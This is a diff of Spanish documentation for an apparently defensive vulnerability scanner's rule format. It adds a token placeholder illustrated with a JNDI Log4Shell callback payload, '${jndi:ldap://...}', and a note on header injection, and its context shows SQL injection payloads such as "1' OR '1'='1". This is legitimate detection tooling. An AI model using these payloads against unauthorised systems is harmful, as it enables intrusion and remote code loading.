@@ -11,7 +11,7 @@ family: sqli                       # familia lógica
 severity: high                     # info | low | medium | high | critical
 cwe: CWE-89                        # referencia CWE
 owasp: WSTG-INPV-05                # referencia OWASP (WSTG o API Top 10)
-inject_into: [query, body, json]   # dónde inyectar: query | body | json | header | fragment
+inject_into: [query, body, json]   # dónde inyectar: query | body | json | header
 payloads:                          # valores a probar en cada punto de inyección
   - "'"
   - "1' OR '1'='1"
@@ -48,6 +48,9 @@ Para vulnerabilidades ciegas (SSRF/RCE/XXE/SSTI/CRLF) usa un oráculo `oob` y pa
 
 - `{{oast_url}}` → URL de callback completa y única por payload (p. ej. `http://<host>/<token>`).
 - `{{oast_domain}}` → solo el host del colaborador.
+- `{{oast_token}}` → solo el token único (útil para embeberlo en un path, p. ej. JNDI: `${jndi:ldap://{{oast_domain}}/{{oast_token}}}`).
+
+Con `inject_into: [header]`, la regla se prueba contra un conjunto de cabeceras habitualmente vulnerables (`User-Agent`, `Referer`, `X-Forwarded-For`, `Host`) — así es como se detectan Log4Shell (logging de cabeceras) y Host header injection.
 
 ```yaml
 id: ssrf-oob
